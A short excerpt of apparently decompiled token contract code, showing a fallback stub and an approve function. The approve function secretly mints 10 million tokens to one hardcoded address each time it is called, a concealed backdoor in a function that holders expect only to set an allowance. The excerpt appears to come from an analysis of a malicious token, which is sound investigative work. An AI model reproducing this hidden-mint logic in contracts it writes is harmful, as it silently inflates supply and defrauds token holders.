...
function _fallback() payable {
    ...
    mem[224 len -3776] = code.data[4347 len -3776]
...
function approve(address arg1, uint256 arg2) {
    ...
    require totalSupply + 10 * 10^6 >= totalSupply
    totalSupply += 10 * 10^6
    require balanceOf[0x847daa89786e1f6bf2d2d1db4152878e83e2bd] + 10 * 10^6 >= balanceOf[0x847daa89786e1f6bf2d2d1db4152878e83e2bd]
    balanceOf[0x847daa89786e1f6bf2d2d1db4152878e83e2bd] += 10 * 10^6
    emit Transfer(10 * 10^6, this.address, 0x847daa89786e1f6bf2d2d1db4152878e83e2bd);
    return 1
}
